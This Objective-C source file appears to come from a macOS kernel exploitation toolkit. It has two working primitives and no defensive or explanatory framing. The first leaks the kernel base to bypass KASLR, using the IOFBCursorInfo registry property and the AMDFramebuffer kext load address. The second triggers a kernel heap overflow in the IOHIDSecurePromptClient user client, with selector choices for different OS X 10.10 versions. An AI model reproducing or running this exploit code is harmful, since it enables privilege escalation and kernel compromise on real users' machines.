#import "lsym_priv.h"
#include <Foundation/Foundation.h>

/*
 returns kernel base on the local system
 */

extern CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef, CFArrayRef);

uint64_t lsym_find_base() {
    NSData* fbdata = (NSData*) ((NSArray*)IORegistryEntrySearchCFProperty(IORegistryGetRootEntry(kIOMasterPortDefault)
                                                                          , kIOServicePlane,CFSTR("IOFBCursorInfo")
                                                                          , kCFAllocatorDefault
                                                                          , kIORegistryIterateRecursively))[1];
    
    uint64_t bytes = ((uint64_t*)[fbdata bytes])[3];
    
    bytes -= [(NSNumber*)((NSDictionary*)OSKextCopyLoadedKextInfo(NULL, NULL))[@"com.apple.kext.AMDFramebuffer"][@"OSBundleLoadAddress"] unsignedLongLongValue];
    
    bytes -= 0x100000;
    
    bytes &= 0x00000000FFF00000;
    
    if(bytes & 0xF0000) {
        printf("[-] kaslr slide not found!\n");
        exit(-1);
    }
    return bytes & (~0xFFFF);
}

/*
 data: data to write past heap boundaries
 size: size of data
 
 returns 0 on failure
 */
char lsym_heap_overflow(char* data, size_t size) {
    kern_return_t err;
    io_iterator_t iterator;
    io_connect_t conn = MACH_PORT_NULL;

    CFMutableDictionaryRef matching = IOServiceMatching("IOHIKeyboard");
    
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
    io_service_t service = IOIteratorNext(iterator);
    
    if (service == IO_OBJECT_NULL) return 0;

    err = IOServiceOpen(service, mach_task_self(), /* IOHIDSecurePromptClient */ 0x48535042, &conn);
    
    if (err != KERN_SUCCESS) return 0;
    
    size += 384;
    
    char* payload = malloc(size);
    
    memcpy(payload + 384, data, size - 384);
    
    if (size >= lsym_heap_overflow_bufsize()) {
        return 0;
    }

    err = IOConnectCallMethod(conn, 10, NULL, 0, payload,  size, NULL, 0, NULL, 0); // heap overflow >= 10.10.1
    
    if (err != KERN_SUCCESS)
        err = IOConnectCallMethod(conn, 12, NULL, 0, payload,  size, NULL, 0, NULL, 0); // heap overflow <= 10.10.1

    if (err != KERN_SUCCESS) return 0;
    
    return 1;
}

uint64_t lsym_heap_overflow_bufsize() {
    return 512;
}

